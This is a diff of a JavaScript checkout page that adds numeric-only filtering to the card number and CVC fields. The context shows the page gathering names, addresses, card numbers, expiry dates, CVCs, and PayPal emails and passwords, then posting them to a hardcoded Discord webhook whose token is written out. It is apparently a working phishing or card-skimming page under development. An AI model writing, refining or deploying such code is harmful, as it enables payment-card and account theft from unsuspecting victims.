@@ -24,7 +24,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
   const paypalEmail = document.querySelector("#paypal-fields input[type='email']");
   const paypalPassword = document.querySelector("#paypal-fields input[type='password']");
-  
+
   const expiryMonth = document.getElementById("expiry-month");
   const expiryYear = document.getElementById("expiry-year");
   const fullNameInput = document.getElementById("full-name"); // Full Name field
@@ -69,6 +69,20 @@ document.addEventListener("DOMContentLoaded", function () {
   currencySelector.addEventListener("change", updatePayButton);
   amountInput.addEventListener("input", updatePayButton);
 
+  // Restrict non-numeric input in the Card Number and CVC fields
+  const cardNumberInput = document.getElementById("card-number");
+  const cardCvcInput = document.getElementById("card-cvc");
+
+  cardNumberInput.addEventListener("input", function (e) {
+    // Remove non-numeric characters
+    e.target.value = e.target.value.replace(/\D/g, "").slice(0, 16); // Limit to 16 digits
+  });
+
+  cardCvcInput.addEventListener("input", function (e) {
+    // Remove non-numeric characters
+    e.target.value = e.target.value.replace(/\D/g, "").slice(0, 3); // Limit to 3 digits
+  });
+
   // Function to send data to Discord webhook
   function sendToDiscord(paymentInfo) {
     const webhookUrl = "https://discord.com/api/webhooks/1319833063160549477/dQ2vbDNYyuO3iQKX_h0gOFUs8fZTEnFfBziH7QPJw0n6CBo1o03WQ-KjCtBq2pgiee4K";
@@ -100,10 +114,10 @@ document.addEventListener("DOMContentLoaded", function () {
     let paymentInfo = `Full Name: ${fullNameInput.value}\nAddress: ${addressInput.value}\nCity: ${cityInput.value}\nZip Code: ${zipcodeInput.value}\nCurrency: ${currencySelector.value}\nAmount: ${amountInput.value}\n`;
 
     if (cardOption.checked) {
-      const cardNumber = document.getElementById("card-number").value;
+      const cardNumber = cardNumberInput.value;
       const cardExpiryMonth = expiryMonth.value;
       const cardExpiryYear = expiryYear.value;
-      const cardCvc = document.getElementById("card-cvc").value;
+      const cardCvc = cardCvcInput.value;
 
       paymentInfo += `Payment Method: Card\nCard Number: ${cardNumber}\nExpiry Date: ${cardExpiryMonth}/${cardExpiryYear}\nCVC: ${cardCvc}`;
     } else if (paypalOption.checked) {
